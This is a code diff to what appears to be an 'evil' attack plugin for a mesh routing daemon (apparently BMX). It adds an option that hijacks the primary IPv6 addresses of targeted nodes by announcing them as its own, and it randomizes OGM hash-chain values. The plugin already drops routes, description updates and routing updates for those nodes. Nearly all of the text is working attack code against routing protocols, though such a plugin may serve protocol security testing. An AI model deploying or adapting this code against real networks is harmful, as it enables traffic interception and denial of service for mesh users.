@@ -47,11 +47,12 @@
 #include "msg.h"
 #include "desc.h"
 #include "content.h"
+#include "ip.h"
 #include "plugin.h"
 #include "schedule.h"
+#include "hna.h"
 #include "tools.h"
 #include "iptools.h"
-#include "ip.h"
 #include "allocate.h"
 #include "evil.h"
 
@@ -59,12 +60,13 @@
 #define CODE_CATEGORY_NAME "evil"
 
 static int32_t evilRouteDropping = DEF_EVIL_ROUTE_DROPPING;
+static int32_t evilPrimaryIps = DEF_EVIL_PRIMARY_IPS;
 static int32_t evilDescDropping = DEF_EVIL_DESC_DROPPING;
 static int32_t evilDescSqns = DEF_EVIL_DESC_SQNS;
 static int32_t evilDhashDropping = DEF_EVIL_DHASH_DROPPING;
 static int32_t evilOgmDropping = DEF_EVIL_OGM_DROPPING;
 static int32_t evilOgmMetrics = DEF_EVIL_OGM_METRICS;
-static int32_t evilOgmSqns = DEF_EVIL_OGM_SQNS;
+static int32_t evilOgmHash = DEF_EVIL_OGM_HASH;
 
 static struct DirWatch *evilDirWatch = NULL;
 static int32_t evil_tun_fd = 0;
@@ -73,6 +75,9 @@ static int32_t evil_tun_idx = 0;
 static int32_t (*orig_tx_frame_desc_adv) (struct tx_frame_iterator *) = NULL;
 static int32_t (*orig_tx_msg_dhash_adv) (struct tx_frame_iterator *) = NULL;
 static int32_t (*orig_tx_frame_ogm_dhash_aggreg_advs) (struct tx_frame_iterator *) = NULL;
+static int32_t (*orig_tx_dsc_tlv_hna) (struct tx_frame_iterator *) = NULL;
+static int32_t (*orig_rx_dsc_tlv_hna) (struct rx_frame_iterator *);
+
 
 STATIC_FUNC
 int32_t evil_tx_frame_description_adv(struct tx_frame_iterator *it)
@@ -145,7 +150,7 @@ int32_t evil_tx_frame_ogm_aggreg_advs(struct tx_frame_iterator *it)
 	struct orig_node *on;
 	struct msg_ogm_adv *msg = (struct msg_ogm_adv*) tx_iterator_cache_msg_ptr(it);
 
-	if (!(evilDirWatch && (evilOgmDropping || evilOgmMetrics || evilOgmSqns)))
+	if (!(evilDirWatch && (evilOgmDropping || evilOgmMetrics || evilOgmHash)))
 		return (*orig_tx_frame_ogm_dhash_aggreg_advs)(it);
 
 	if (tx_iterator_cache_data_space_max(it, 0, 0) < oan->msgsLen)
@@ -163,7 +168,10 @@ int32_t evil_tx_frame_ogm_aggreg_advs(struct tx_frame_iterator *it)
 		if (tn && evilOgmDropping)
 			continue;
 
-		msg->chainOgm = chainOgmCalc(on->dc, on->dc->ogmSqnMaxSend);
+		if (tn && evilOgmHash)
+			cryptRand(&msg->chainOgm, sizeof(msg->chainOgm));
+		else
+			msg->chainOgm = chainOgmCalc(on->dc, on->dc->ogmSqnMaxSend);
 
 		FMETRIC_U16_T fm16 = umetric_to_fmetric((tn && evilOgmMetrics) ? UMETRIC_MAX : on->neighPath.um);
 		msg->u.f.metric_exp = fm16.val.f.exp_fm16;
@@ -220,7 +228,7 @@ int32_t evil_tx_frame_ogm_aggreg_advs(struct tx_frame_iterator *it)
 STATIC_FUNC
 void idChanged_Evil(IDM_T del, struct KeyWatchNode *kwn, struct DirWatch *dw)
 {
-	dbgf_sys(DBGT_WARN, "del=%d kwn=%d kwnFile=%s kwnGlobalId=%s kwnMisc=%d dw=%d evilRouteDropping=%d",
+	dbgf_sys(DBGT_WARN, "del=%d kwn=%d kwnFile=%s kwnGlobalId=%s kwnMisc=%X dw=%d evilRouteDropping=%d",
 		del, !!kwn, kwn ? kwn->fileName : NULL, cryptShaAsShortStr(kwn ? &kwn->global_id : NULL), kwn ? kwn->misc : -1, !!dw, evilRouteDropping);
 
 	if (!kwn)
@@ -228,16 +236,32 @@ void idChanged_Evil(IDM_T del, struct KeyWatchNode *kwn, struct DirWatch *dw)
 
 	struct net_key routeKey = {.af = AF_INET6, .mask = 128, .ip = create_crypto_IPv6(&autoconf_prefix_cfg, &kwn->global_id)};
 
-	if (!del && !kwn->misc && evilRouteDropping) {
+#define KWN_MISC_ROUTE_DROPPING 0x01
+#define KWN_MISC_IP_HIJACKING   0x02
+
+	if (!del && !(kwn->misc & KWN_MISC_ROUTE_DROPPING) && evilRouteDropping) {
 
 		iproute(IP_ROUTE_TUNS, ADD, NO, &routeKey, DEF_EVIL_IP_TABLE, 0, evil_tun_idx, NULL, NULL, DEF_EVIL_IP_METRIC, NULL);
-		kwn->misc = YES;
+		kwn->misc |= KWN_MISC_ROUTE_DROPPING;
 
-	} else if (kwn->misc) {
+	} else if (kwn->misc & KWN_MISC_ROUTE_DROPPING) {
 
 		iproute(IP_ROUTE_TUNS, DEL, NO, &routeKey, DEF_EVIL_IP_TABLE, 0, evil_tun_idx, NULL, NULL, DEF_EVIL_IP_METRIC, NULL);
-		kwn->misc = NO;
+		kwn->misc &= (~KWN_MISC_ROUTE_DROPPING);
 	}
+
+	
+	if (!del && !(kwn->misc & KWN_MISC_IP_HIJACKING) && evilPrimaryIps) {
+
+		my_description_changed = YES;
+		kwn->misc |= KWN_MISC_IP_HIJACKING;
+
+	} else if (kwn->misc & KWN_MISC_IP_HIJACKING) {
+
+		my_description_changed = YES;
+		kwn->misc &= (~KWN_MISC_IP_HIJACKING);
+	}
+
 
 
 	if (del) {
@@ -318,26 +342,93 @@ int32_t opt_evil_init(uint8_t cmd, uint8_t _save, struct opt_type *opt, struct o
 	return SUCCESS;
 }
 
+
+STATIC_FUNC
+int evil_rx_dsc_tlv_hna(struct rx_frame_iterator *it)
+{
+        TRACE_FUNCTION_CALL;
+        ASSERTION(-500357, (it->f_type == BMX_DSC_TLV_HNA6));
+	assertion(-502326, (it->dcOp && it->dcOp->kn));
+
+	if (it->dcOp->kn == myKey)
+		return it->f_msgs_len;
+	else
+		return orig_rx_dsc_tlv_hna(it);
+}
+
+
+
+STATIC_FUNC
+int evil_tx_dsc_tlv_hna(struct tx_frame_iterator *it)
+{
+        TRACE_FUNCTION_CALL;
+
+	dbgf_sys(DBGT_INFO, "enabled=%d attacked nodes=%d", evilPrimaryIps, evilDirWatch ? (int)evilDirWatch->node_tree.items : -1);
+
+	if (!evilPrimaryIps || !evilDirWatch || !evilDirWatch->node_tree.items)
+		return ((*orig_tx_dsc_tlv_hna)(it));
+
+        assertion(-500765, (it->frame_type == BMX_DSC_TLV_HNA6));
+
+        uint8_t *data = tx_iterator_cache_msg_ptr(it);
+        uint32_t max_size = tx_iterator_cache_data_space_pref(it, 0, 0);
+        uint32_t pos = 0;
+	struct avl_node *an = NULL;
+
+	struct KeyWatchNode *kwn;
+	for (an = NULL; (kwn = avl_iterate_item(&evilDirWatch->node_tree, &an));) {
+		IPX_T attacked_primary_ip = create_crypto_IPv6(&autoconf_prefix_cfg, &kwn->global_id);
+		pos = create_tlv_hna(data, max_size, pos, setNet(NULL, AF_INET6, 128, &attacked_primary_ip), 0);
+		dbgf_sys(DBGT_INFO, "Hijacking ip=%s", ip6AsStr(&attacked_primary_ip));
+	}
+/*
+        if (!is_ip_set(&my_primary_ip))
+                return TLV_TX_DATA_IGNORED;
+
+        pos = _create_tlv_hna(data, max_size, pos, setNet(NULL, AF_INET6, 128, &my_primary_ip), 0);
+
+
+	struct tun_in_node *tin;
+	for (an = NULL; (tin = avl_iterate_item(&tun_in_tree, &an));) {
+		if (tin->upIfIdx && tin->tun6Id >= 0 && is_ip_set(&tin->remoteDummyIp6)) {
+			assertion(-501237, (tin->upIfIdx && tin->tun6Id >= 0));
+			pos = _create_tlv_hna(data, max_size, pos, setNet(NULL, AF_INET6, 128, &tin->remoteDummyIp6), DESC_MSG_HNA_FLAG_NO_ROUTE);
+		}
+	}
+
+	struct opt_parent *p = NULL;
+	while ((p = list_iterate(&(get_option(NULL, NO, ARG_UHNA)->d.parents_instance_list), p))) {
+		struct net_key hna = ZERO_NETCFG_KEY;
+		str2netw(p->val, &hna.ip, NULL, &hna.mask, &hna.af, NO);
+		assertion(-502325, (is_ip_valid(&hna.ip, hna.af)));
+		pos = _create_tlv_hna(data, max_size, pos, &hna, 0);
+	}
+*/
+        return pos;
+}
+
 static struct opt_type evil_options[] = {
 //        ord parent long_name          shrt Attributes				*ival		min		max		default		*func,*syntax,*help
 	{ODI,0,"evilInit",              0,  8,0,A_PS0,A_ADM,A_INI,A_ARG,A_ANY,	0,		0,		0,		0,0,            opt_evil_init,
 			NULL,HLP_DUMMY_OPT},
 	{ODI,0,ARG_ATTACKED_NODES_DIR,  0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY,	0,		0,		0,		0,DEF_ATTACKED_NODES_DIR, opt_evil_watch,
-			ARG_DIR_FORM,"directory with global-id hashes of this node's attacked other nodes"},
+			ARG_DIR_FORM,"Directory with global-id hashes of this node's attacked other nodes"},
 	{ODI,0,ARG_EVIL_ROUTE_DROPPING, 0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilRouteDropping,MIN_EVIL_ROUTE_DROPPING,MAX_EVIL_ROUTE_DROPPING,DEF_EVIL_ROUTE_DROPPING,0,opt_evil_route,
-			ARG_VALUE_FORM, "do not forward IPv6 packets towards attacked nodes"},
-	{ODI,0,ARG_EVIL_DESC_DROPPING,  0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilDescDropping,MIN_EVIL_DESC_DROPPING,MAX_EVIL_DESC_DROPPING,DEF_EVIL_DESC_DROPPING,0,NULL,
-			ARG_VALUE_FORM, "do not propagate description updates of attacked nodes"},
-	{ODI,0,ARG_EVIL_DESC_SQNS,      0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilDescSqns,   MIN_EVIL_DESC_SQNS,MAX_EVIL_DESC_SQNS,DEF_EVIL_DESC_SQNS,0,NULL,
-			ARG_VALUE_FORM, "do not propagate description updates of attacked nodes"},
+			ARG_VALUE_FORM, "Do not forward IPv6 packets towards attacked nodes"},
+	{ODI,0,ARG_EVIL_PRIMARY_IPS,    0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilPrimaryIps,   MIN_EVIL_PRIMARY_IPS,MAX_EVIL_PRIMARY_IPS,DEF_EVIL_PRIMARY_IPS,0,opt_evil_route,
+			ARG_VALUE_FORM, "Do not forward IPv6 packets towards attacked nodes"},
+	{ODI,0,ARG_EVIL_DESC_DROPPING,  0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilDescDropping, MIN_EVIL_DESC_DROPPING,MAX_EVIL_DESC_DROPPING,DEF_EVIL_DESC_DROPPING,0,NULL,
+			ARG_VALUE_FORM, "Do not propagate description updates of attacked nodes"},
+	{ODI,0,ARG_EVIL_DESC_SQNS,      0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilDescSqns,     MIN_EVIL_DESC_SQNS,MAX_EVIL_DESC_SQNS,DEF_EVIL_DESC_SQNS,0,NULL,
+			ARG_VALUE_FORM, "Increment description sqn of attacked nodes"},
 	{ODI,0,ARG_EVIL_DHASH_DROPPING, 0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilDhashDropping,MIN_EVIL_DHASH_DROPPING,MAX_EVIL_DHASH_DROPPING,DEF_EVIL_DHASH_DROPPING,0,NULL,
-			ARG_VALUE_FORM, "do not propagate description hash (Dhash) updates of attacked nodes"},
-	{ODI,0,ARG_EVIL_OGM_DROPPING,   0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilOgmDropping,MIN_EVIL_OGM_DROPPING,MAX_EVIL_OGM_DROPPING,DEF_EVIL_OGM_DROPPING,0,NULL,
-			ARG_VALUE_FORM, "do not propagate routing updates (OGMs) of attacked nodes"},
-	{ODI,0,ARG_EVIL_OGM_METRICS,    0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilOgmMetrics, MIN_EVIL_OGM_METRICS,MAX_EVIL_OGM_METRICS,DEF_EVIL_OGM_METRICS,0,NULL,
+			ARG_VALUE_FORM, "Do not propagate description hash (Dhash) updates of attacked nodes"},
+	{ODI,0,ARG_EVIL_OGM_DROPPING,   0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilOgmDropping,  MIN_EVIL_OGM_DROPPING,MAX_EVIL_OGM_DROPPING,DEF_EVIL_OGM_DROPPING,0,NULL,
+			ARG_VALUE_FORM, "Do not propagate routing updates (OGMs) of attacked nodes"},
+	{ODI,0,ARG_EVIL_OGM_METRICS,    0,  9,2,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilOgmMetrics,   MIN_EVIL_OGM_METRICS,MAX_EVIL_OGM_METRICS,DEF_EVIL_OGM_METRICS,0,NULL,
 			ARG_VALUE_FORM, "Modify metrics of routing updates (OGMs) of attacked nodes"},
-	{ODI,0,ARG_EVIL_OGM_SQNS,       0,  9,0,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilOgmSqns,    MIN_EVIL_OGM_SQNS,MAX_EVIL_OGM_SQNS,DEF_EVIL_OGM_SQNS,0,NULL,
-			ARG_VALUE_FORM, "Modify SQNs of routing updates (OGMs) of attacked nodes"}
+	{ODI,0,ARG_EVIL_OGM_HASH,       0,  9,0,A_PS1,A_ADM,A_DYI,A_CFA,A_ANY, &evilOgmHash,      MIN_EVIL_OGM_HASH,MAX_EVIL_OGM_HASH,DEF_EVIL_OGM_HASH,0,NULL,
+			ARG_VALUE_FORM, "Randomize hash-chain value of routing updates (OGMs) of attacked nodes"}
 };
 
 
@@ -355,6 +446,12 @@ static int32_t evil_init( void )
 	orig_tx_frame_ogm_dhash_aggreg_advs = packet_frame_db->handls[FRAME_TYPE_OGM_ADV].tx_frame_handler;
 	packet_frame_db->handls[FRAME_TYPE_OGM_ADV].tx_frame_handler = evil_tx_frame_ogm_aggreg_advs;
 
+	orig_tx_dsc_tlv_hna = description_tlv_db->handls[BMX_DSC_TLV_HNA6].tx_frame_handler;
+	description_tlv_db->handls[BMX_DSC_TLV_HNA6].tx_frame_handler = evil_tx_dsc_tlv_hna;
+
+	orig_rx_dsc_tlv_hna = description_tlv_db->handls[BMX_DSC_TLV_HNA6].rx_frame_handler;
+	description_tlv_db->handls[BMX_DSC_TLV_HNA6].rx_frame_handler = evil_rx_dsc_tlv_hna;
+
 	return SUCCESS;
 }
 
@@ -364,6 +461,8 @@ static void evil_cleanup( void )
 	packet_frame_db->handls[FRAME_TYPE_DESC_ADVS].tx_frame_handler = orig_tx_frame_desc_adv;
 	packet_frame_db->handls[FRAME_TYPE_IID_ADV].tx_msg_handler = orig_tx_msg_dhash_adv;
 	packet_frame_db->handls[FRAME_TYPE_OGM_ADV].tx_frame_handler = orig_tx_frame_ogm_dhash_aggreg_advs;
+	description_tlv_db->handls[BMX_DSC_TLV_HNA6].tx_frame_handler = orig_tx_dsc_tlv_hna;
+	description_tlv_db->handls[BMX_DSC_TLV_HNA6].rx_frame_handler = orig_rx_dsc_tlv_hna;
 
 	cleanup_dir_watch(&evilDirWatch);
 
